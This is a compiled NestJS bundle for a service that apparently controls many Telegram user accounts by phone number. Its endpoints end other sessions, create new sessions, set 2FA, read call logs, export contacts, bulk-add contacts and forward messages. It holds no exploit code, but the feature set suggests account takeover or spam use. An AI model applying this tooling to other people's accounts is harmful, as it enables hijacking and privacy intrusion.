/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var InitModule_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.InitModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
const configuration_schema_1 = __webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts");
const init_controller_1 = __webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let InitModule = InitModule_1 = class InitModule {
    constructor(connection, configService) {
        this.connection = connection;
        this.configService = configService;
        this.HEALTH_CHECK_INTERVAL = 30000;
    }
    async onModuleInit() {
        if (InitModule_1.initializationStatus.isInitializing || InitModule_1.initializationStatus.isInitialized) {
            return;
        }
        InitModule_1.initializationStatus.isInitializing = true;
        try {
            console.log(`Initializing configuration module...`);
            await this.validateConnection();
            this.setupConnectionEventHandlers();
            this.startHealthCheck();
            InitModule_1.initializationStatus.isInitialized = true;
            InitModule_1.initializationStatus.isInitializing = false;
            console.log(`Started :: ${process.env.clientId}`);
            await this.sendNotification(`started :: ${process.env.clientId}`);
        }
        catch (error) {
            InitModule_1.initializationStatus.isInitializing = false;
            console.error('Failed to initialize configuration module:', error);
            throw error;
        }
    }
    async validateConnection() {
        const maxRetries = 3;
        let retryCount = 0;
        while (retryCount < maxRetries) {
            try {
                if (this.connection.readyState !== 1) {
                    throw new Error(`MongoDB connection not ready. Current state: ${this.connection.readyState}`);
                }
                await this.connection.db.admin().ping();
                console.log('MongoDB connection validated successfully');
                return;
            }
            catch (error) {
                retryCount++;
                console.warn(`Connection validation attempt ${retryCount}/${maxRetries} failed:`, error);
                if (retryCount >= maxRetries) {
                    throw new Error(`Failed to validate MongoDB connection after ${maxRetries} attempts: ${error.message}`);
                }
                await this.delay(2000 * retryCount);
            }
        }
    }
    setupConnectionEventHandlers() {
        this.connection.on('connected', () => {
            console.log('MongoDB Connected');
        });
        this.connection.on('error', (error) => {
            console.error('MongoDB Connection Error:', error);
        });
        this.connection.on('disconnected', () => {
            console.warn('MongoDB Disconnected');
        });
        this.connection.on('reconnected', () => {
            console.log('MongoDB Reconnected');
        });
        this.connection.on('close', () => {
            console.log('MongoDB Connection Closed');
        });
    }
    startHealthCheck() {
        this.connectionHealthCheckInterval = setInterval(async () => {
            try {
                if (this.connection.readyState === 1) {
                    await this.connection.db.admin().ping();
                }
            }
            catch (error) {
                console.error('MongoDB health check failed:', error);
            }
        }, this.HEALTH_CHECK_INTERVAL);
    }
    stopHealthCheck() {
        if (this.connectionHealthCheckInterval) {
            clearInterval(this.connectionHealthCheckInterval);
            this.connectionHealthCheckInterval = undefined;
        }
    }
    async sendNotification(message) {
        try {
            const url = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(message)}`;
            await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { timeout: 5000 });
        }
        catch (error) {
            console.warn('Failed to send notification:', error);
        }
    }
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async onModuleDestroy() {
        if (InitModule_1.initializationStatus.isDestroying) {
            return;
        }
        InitModule_1.initializationStatus.isDestroying = true;
        try {
            console.log('Init Module destroying...');
            this.stopHealthCheck();
            await this.sendNotification(`closed :: ${process.env.clientId}`);
            if (this.connection && this.connection.readyState !== 0) {
                console.log('Closing MongoDB connection...');
                await this.connection.close(true);
            }
        }
        catch (error) {
            console.error('Error during module destruction:', error);
        }
        finally {
            InitModule_1.initializationStatus = {
                isInitialized: false,
                isInitializing: false,
                isDestroying: false,
            };
        }
    }
    static getInitializationStatus() {
        return { ...InitModule_1.initializationStatus };
    }
    static isReady() {
        return InitModule_1.initializationStatus.isInitialized && !InitModule_1.initializationStatus.isDestroying;
    }
};
exports.InitModule = InitModule;
InitModule.initializationStatus = {
    isInitialized: false,
    isInitializing: false,
    isDestroying: false,
};
exports.InitModule = InitModule = InitModule_1 = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            config_1.ConfigModule.forRoot({
                isGlobal: true,
                cache: true,
                expandVariables: true,
                envFilePath: '.env',
            }),
            mongoose_1.MongooseModule.forRootAsync({
                imports: [config_1.ConfigModule],
                useFactory: async (configService) => {
                    const uri = process.env.mongouri || configService.get('mongouri');
                    if (!uri) {
                        throw new Error('MongoDB URI is not configured');
                    }
                    return {
                        uri,
                        maxPoolSize: 10,
                        serverSelectionTimeoutMS: 10000,
                        socketTimeoutMS: 45000,
                        connectTimeoutMS: 10000,
                        heartbeatFrequencyMS: 10000,
                        family: 4,
                        retryWrites: true,
                        retryReads: true,
                    };
                },
                inject: [config_1.ConfigService],
            }),
            mongoose_1.MongooseModule.forFeature([{
                    name: 'configurationModule',
                    collection: 'configuration',
                    schema: configuration_schema_1.ConfigurationSchema
                }])
        ],
        providers: [init_service_1.ConfigurationService],
        controllers: [init_controller_1.ConfigurationController],
        exports: [init_service_1.ConfigurationService, mongoose_1.MongooseModule],
    }),
    __param(0, (0, common_1.Inject)((0, mongoose_1.getConnectionToken)())),
    __metadata("design:paramtypes", [mongoose_2.Connection,
        config_1.ConfigService])
], InitModule);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.service.ts":
/*!**********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.service.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ConfigurationService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
let ConfigurationService = ConfigurationService_1 = class ConfigurationService {
    constructor(configurationModel, configService) {
        this.configurationModel = configurationModel;
        this.configService = configService;
        this.logger = new common_1.Logger(ConfigurationService_1.name);
    }
    async onModuleInit() {
        if (ConfigurationService_1.initialized) {
            return;
        }
        try {
            await this.initializeConfiguration();
            ConfigurationService_1.initialized = true;
        }
        catch (error) {
            this.logger.error('Failed to initialize configuration', error);
            throw error;
        }
    }
    async initializeConfiguration() {
        this.logger.log('Initializing configuration service...');
        await this.setEnv();
        await TelegramBots_config_1.BotConfig.getInstance().ready();
        await this.notifyStart();
        this.logger.log('Configuration service initialized successfully');
    }
    async notifyStart() {
        try {
            const clientId = process.env.clientId || this.configService.get('clientId');
            if (!clientId) {
                this.logger.warn('No clientId found in environment or configuration');
                return;
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Started :: ${clientId}`)}`);
        }
        catch (error) {
            this.logger.warn('Failed to send start notification', error);
        }
    }
    async findOne() {
        const configuration = await this.configurationModel.findOne({}).lean().exec();
        if (!configuration) {
            throw new common_1.NotFoundException('Configuration not found');
        }
        return configuration;
    }
    async setEnv() {
        this.logger.log('Setting environment variables...');
        const configuration = await this.configurationModel.findOne({}, { _id: 0 }).lean();
        if (!configuration) {
            this.logger.warn('No configuration found in database, using environment variables only');
            return;
        }
        for (const [key, value] of Object.entries(configuration)) {
            if (value !== undefined && value !== null) {
                if (!process.env[key]) {
                    process.env[key] = String(value);
                    this.logger.debug(`Set environment variable: ${key}`);
                }
            }
        }
        this.logger.log('Finished setting environment variables');
    }
    async update(updateDto) {
        const { _id, ...updateData } = updateDto;
        try {
            const updatedConfig = await this.configurationModel.findOneAndUpdate({}, { $set: updateData }, { new: true, upsert: true, lean: true }).exec();
            if (!updatedConfig) {
                throw new common_1.NotFoundException('Failed to update configuration');
            }
            Object.entries(updateData).forEach(([key, value]) => {
                if (value !== undefined && value !== null) {
                    process.env[key] = String(value);
                }
            });
            return updatedConfig;
        }
        catch (error) {
            this.logger.error('Failed to update configuration', error);
            throw error;
        }
    }
};
exports.ConfigurationService = ConfigurationService;
ConfigurationService.initialized = false;
exports.ConfigurationService = ConfigurationService = ConfigurationService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('configurationModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        config_1.ConfigService])
], ConfigurationService);


/***/ }),

/***/ "./src/components/Telegram/Telegram.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/Telegram.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const dto_1 = __webpack_require__(/*! ./dto */ "./src/components/Telegram/dto/index.ts");
const metadata_operations_dto_1 = __webpack_require__(/*! ./dto/metadata-operations.dto */ "./src/components/Telegram/dto/metadata-operations.dto.ts");
const create_chat_folder_dto_1 = __webpack_require__(/*! ./dto/create-chat-folder.dto */ "./src/components/Telegram/dto/create-chat-folder.dto.ts");
const connection_management_dto_1 = __webpack_require__(/*! ./dto/connection-management.dto */ "./src/components/Telegram/dto/connection-management.dto.ts");
const platform_express_1 = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
const multer = __importStar(__webpack_require__(/*! multer */ "multer"));
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
const delete_chat_dto_1 = __webpack_require__(/*! ./dto/delete-chat.dto */ "./src/components/Telegram/dto/delete-chat.dto.ts");
const update_username_dto_1 = __webpack_require__(/*! ./dto/update-username.dto */ "./src/components/Telegram/dto/update-username.dto.ts");
const send_message_dto_1 = __webpack_require__(/*! ./dto/send-message.dto */ "./src/components/Telegram/dto/send-message.dto.ts");
let TelegramController = class TelegramController {
    constructor(telegramService) {
        this.telegramService = telegramService;
    }
    async connect(mobile, autoDisconnect, handler, timeout) {
        const options = {
            autoDisconnect,
            handler,
            timeout
        };
        await this.telegramService.connect(mobile, options);
        return { message: 'Connected successfully' };
    }
    async disconnect(mobile) {
        await this.telegramService.disconnect(mobile);
        return { message: 'Disconnected successfully' };
    }
    async disconnectAll() {
        await this.telegramService.disconnectAll();
        return { message: 'All clients disconnected successfully' };
    }
    getConnectionStats() {
        return this.telegramService.getConnectionStats();
    }
    getClientState(mobile) {
        return this.telegramService.getClientState(mobile);
    }
    getActiveConnectionCount() {
        return this.telegramService.getActiveConnectionCount();
    }
    async getMe(mobile) {
        return this.telegramService.getMe(mobile);
    }
    async getEntity(mobile, entity) {
        return this.telegramService.getEntity(mobile, entity);
    }
    async updateProfile(mobile, updateProfileDto) {
        return this.telegramService.updateNameandBio(mobile, updateProfileDto.firstName, updateProfileDto.about);
    }
    async setProfilePhoto(mobile, photoDto) {
        return this.telegramService.setProfilePic(mobile, photoDto.name);
    }
    async deleteProfilePhotos(mobile) {
        return this.telegramService.deleteProfilePhotos(mobile);
    }
    async getMessages(mobile, chatId, limit) {
        return this.telegramService.getMessages(mobile, chatId, limit);
    }
    async sendMessage(mobile, dto) {
        return this.telegramService.sendMessage(mobile, dto);
    }
    async forwardMessage(mobile, forwardDto) {
        return this.telegramService.forwardBulkMessages(mobile, forwardDto.fromChatId, forwardDto.toChatId, forwardDto.messageIds);
    }
    async processBatchMessages(mobile, batchOp) {
        return this.telegramService.processBatch(batchOp.items, batchOp.batchSize || 20, async (batch) => {
            switch (batchOp.operation) {
                case dto_1.BatchOperationType.FORWARD:
                    for (const item of batch) {
                        if ('messageId' in item && item.fromChatId && item.toChatId) {
                            await this.telegramService.forwardMessage(mobile, item.toChatId, item.fromChatId, item.messageId);
                        }
                    }
                    break;
                case dto_1.BatchOperationType.DELETE:
                    for (const item of batch) {
                        await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });
                    }
                    break;
                default:
                    throw new common_1.BadRequestException('Unsupported batch operation');
            }
        }, batchOp.delayMs);
    }
    async searchMessages(mobile, queryParams) {
        return this.telegramService.searchMessages(mobile, queryParams);
    }
    async getChannelInfo(mobile, includeIds) {
        return this.telegramService.getChannelInfo(mobile, includeIds);
    }
    async forwardMedia(mobile, channel, fromChatId) {
        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
        return this.telegramService.forwardMedia(mobile, channel, fromChatId);
    }
    async leaveChannel(mobile, channel) {
        return this.telegramService.leaveChannel(mobile, channel);
    }
    async updateUsername(mobile, updateUsernameDto) {
        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);
    }
    async setup2FA(mobile) {
        return this.telegramService.set2Fa(mobile);
    }
    async updatePrivacy(mobile) {
        return this.telegramService.updatePrivacy(mobile);
    }
    async updatePrivacyBatch(mobile, settings) {
        return this.telegramService.updatePrivacyBatch(mobile, settings);
    }
    async getActiveSessions(mobile) {
        return this.telegramService.getAuths(mobile);
    }
    async terminateOtherSessions(mobile) {
        return this.telegramService.removeOtherAuths(mobile);
    }
    async createNewSession(mobile) {
        return this.telegramService.createNewSession(mobile);
    }
    async getSessionInfo(mobile) {
        return this.telegramService.getSessionInfo(mobile);
    }
    async terminateSession(mobile, data) {
        return this.telegramService.terminateSession(mobile, data);
    }
    async getConnectionStatus() {
        return {
            status: await this.telegramService.getConnectionStatus()
        };
    }
    async getCallLogStats(mobile) {
        return this.telegramService.getCallLog(mobile);
    }
    async addContactsBulk(mobile, contactsDto) {
        return this.telegramService.addContacts(mobile, contactsDto.phoneNumbers, contactsDto.prefix);
    }
    async getContacts(mobile) {
        return await this.telegramService.getContacts(mobile);
    }
    async sendMedia(mobile, sendMediaDto) {
        const client = await connection_manager_1.connectionManager.getClient(mobile);
        if (sendMediaDto.type === dto_1.MediaType.PHOTO) {
            return client.sendPhotoChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
        }
        return client.sendFileChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);
    }
    async downloadMedia(mobile, chatId, messageId, res) {
        return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);
    }
    async sendMediaAlbum(mobile, albumDto) {
        return this.telegramService.sendMediaAlbum(mobile, albumDto);
    }
    async getMediaMetadata(mobile, chatId, types, startDate, endDate, limit, minId, maxId, all) {
        return this.telegramService.getMediaMetadata(mobile, {
            chatId,
            types,
            startDate: startDate ? new Date(startDate) : undefined,
            endDate: endDate ? new Date(endDate) : undefined,
            limit,
            minId,
            maxId,
            all
        });
    }
    async getFilteredMedia(mobile, chatId, types, startDate, endDate, limit, minId, maxId) {
        return this.telegramService.getFilteredMedia(mobile, {
            chatId,
            types,
            startDate: startDate ? new Date(startDate) : undefined,
            endDate: endDate ? new Date(endDate) : undefined,
            limit,
            minId,
            maxId
        });
    }
    async getGroupMembers(mobile, groupId) {
        return this.telegramService.getGrpMembers(mobile, groupId);
    }
    async blockChat(mobile, chatId) {
        return this.telegramService.blockUser(mobile, chatId);
    }
    async deleteChatHistory(mobile, deleteHistoryDto) {
        return this.telegramService.deleteChat(mobile, deleteHistoryDto);
    }
    async sendMessageWithInlineButton(mobile, chatId, message, url) {
        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);
    }
    async getAllDialogs(mobile, limit = 500, offsetId = 0, archived = false) {
        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });
    }
    async getLastActiveTime(mobile) {
        return this.telegramService.getLastActiveTime(mobile);
    }
    async createGroupWithOptions(mobile, options) {
        return this.telegramService.createGroupWithOptions(mobile, options);
    }
    async updateGroupSettings(mobile, settings) {
        return this.telegramService.updateGroupSettings(mobile, settings);
    }
    async addGroupMembers(memberOp, mobile) {
        return this.telegramService.addGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async removeGroupMembers(memberOp, mobile) {
        return this.telegramService.removeGroupMembers(mobile, memberOp.groupId, memberOp.members);
    }
    async handleAdminOperation(adminOp, mobile) {
        if (adminOp.isPromote) {
            return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
        }
        else {
            return this.telegramService.demoteAdmin(mobile, adminOp.groupId, adminOp.userId);
        }
    }
    async cleanupChat(mobile, cleanup) {
        return this.telegramService.cleanupChat(mobile, {
            chatId: cleanup.chatId,
            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,
            onlyMedia: cleanup.onlyMedia,
            excludePinned: cleanup.excludePinned
        });
    }
    async getChatStatistics(mobile, chatId, period = 'week') {
        return this.telegramService.getChatStatistics(mobile, chatId, period);
    }
    async scheduleMessage(mobile, schedule) {
        return this.telegramService.scheduleMessage(mobile, {
            chatId: schedule.chatId,
            message: schedule.message,
            scheduledTime: new Date(schedule.scheduledTime),
            replyTo: schedule.replyTo,
            silent: schedule.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        return this.telegramService.getScheduledMessages(mobile, chatId);
    }
    async sendVoiceMessage(mobile, voice) {
        return this.telegramService.sendVoiceMessage(mobile, voice);
    }
    async sendViewOnceMedia(mobile, file, viewOnceDto) {
        if (viewOnceDto.sourceType === dto_1.MediaSourceType.BINARY && file) {
            return this.telegramService.sendViewOnceMedia(mobile, {
                chatId: viewOnceDto.chatId,
                sourceType: viewOnceDto.sourceType,
                binaryData: file.buffer,
                caption: viewOnceDto.caption,
                filename: viewOnceDto.filename || file.originalname
            });
        }
        return this.telegramService.sendViewOnceMedia(mobile, {
            chatId: viewOnceDto.chatId,
            sourceType: viewOnceDto.sourceType,
            path: viewOnceDto.path,
            base64Data: viewOnceDto.base64Data,
            caption: viewOnceDto.caption,
            filename: viewOnceDto.filename
        });
    }
    async getChatHistory(mobile, chatId, offset, limit) {
        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);
    }
    async promoteToAdmin(mobile, adminOp) {
        return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);
    }
    async demoteAdmin(mobile, memberOp) {
        return this.telegramService.demoteAdmin(mobile, memberOp.groupId, memberOp.members[0]);
    }
    async unblockGroupUser(mobile, data) {
        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);
    }
    async getGroupAdmins(mobile, groupId) {
        return this.telegramService.getGroupAdmins(mobile, groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        return this.telegramService.getGroupBannedUsers(mobile, groupId);
    }
    async exportContacts(mobile, exportDto, res) {
        const data = await this.telegramService.exportContacts(mobile, exportDto.format, exportDto.includeBlocked);
        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;
        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.send(data);
    }
    async importContacts(mobile, contacts) {
        return this.telegramService.importContacts(mobile, contacts);
    }
    async manageBlockList(mobile, blockList) {
        return this.telegramService.manageBlockList(mobile, blockList.userIds, blockList.block);
    }
    async getContactStatistics(mobile) {
        return this.telegramService.getContactStatistics(mobile);
    }
    async createChatFolder(mobile, folder) {
        return this.telegramService.createChatFolder(mobile, folder);
    }
    async getChatFolders(mobile) {
        return this.telegramService.getChatFolders(mobile);
    }
    async editMessage(mobile, options) {
        return this.telegramService.editMessage(mobile, options);
    }
    async updateChatSettings(mobile, settings) {
        return this.telegramService.updateChatSettings(mobile, settings);
    }
    async sendMediaBatch(mobile, options) {
        return this.telegramService.sendMediaBatch(mobile, options);
    }
    async hasPassword(mobile) {
        return this.telegramService.hasPassword(mobile);
    }
    async getChats(mobile, limit, offsetDate, offsetId, offsetPeer, folderId) {
        return this.telegramService.getChats(mobile, {
            limit,
            offsetDate,
            offsetId,
            offsetPeer,
            folderId
        });
    }
    async getFileUrl(mobile, url, filename) {
        return this.telegramService.getFileUrl(mobile, url, filename);
    }
    async getMessageStats(mobile, options) {
        return this.telegramService.getMessageStats(mobile, options);
    }
    async getTopPrivateChats(mobile) {
        return this.telegramService.getTopPrivateChats(mobile);
    }
    async addBotsToChannel(mobile, body) {
        return this.telegramService.addBotsToChannel(mobile, body.channelIds);
    }
    async createBot(mobile, createBotDto) {
        return this.telegramService.createBot(mobile, createBotDto);
    }
};
exports.TelegramController = TelegramController;
__decorate([
    (0, common_1.Get)('connect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Connect to Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'autoDisconnect', description: 'Whether to auto disconnect the client after period of inactivity', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiQuery)({ name: 'handler', description: 'Whether to use event handler', required: false, type: Boolean, default: true }),
    (0, swagger_1.ApiQuery)({ name: 'timeout', description: 'Connection timeout in milliseconds', required: false, type: Number, default: 30000 }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Successfully connected' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Connection failed' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('autoDisconnect')),
    __param(2, (0, common_1.Query)('handler')),
    __param(3, (0, common_1.Query)('timeout')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean, Boolean, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "connect", null);
__decorate([
    (0, common_1.Get)('disconnect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect from Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Successfully disconnected' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnect", null);
__decorate([
    (0, common_1.Get)('disconnect-all'),
    (0, swagger_1.ApiOperation)({ summary: 'Disconnect all clients' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All clients disconnected successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnectAll", null);
__decorate([
    (0, common_1.Get)('connection/stats'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection statistics' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatsDto }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", connection_management_dto_1.ConnectionStatsDto)
], TelegramController.prototype, "getConnectionStats", null);
__decorate([
    (0, common_1.Get)('connection/state/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get connection state for a client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatusDto }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Client not found' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", connection_management_dto_1.ConnectionStatusDto)
], TelegramController.prototype, "getClientState", null);
__decorate([
    (0, common_1.Get)('connection/count'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active connection count' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Number of active connections' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Number)
], TelegramController.prototype, "getActiveConnectionCount", null);
__decorate([
    (0, common_1.Get)('me/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get current user profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Profile retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMe", null);
__decorate([
    (0, common_1.Get)('entity/:mobile/:entity'),
    (0, swagger_1.ApiOperation)({ summary: 'Get Entity profile' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiParam)({ name: 'entity', description: 'Entity identifier', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Entity retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('entity')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getEntity", null);
__decorate([
    (0, common_1.Post)('profile/update/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update profile information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.UpdateProfileDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.UpdateProfileDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateProfile", null);
__decorate([
    (0, common_1.Post)('profile/photo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set profile photo' }),
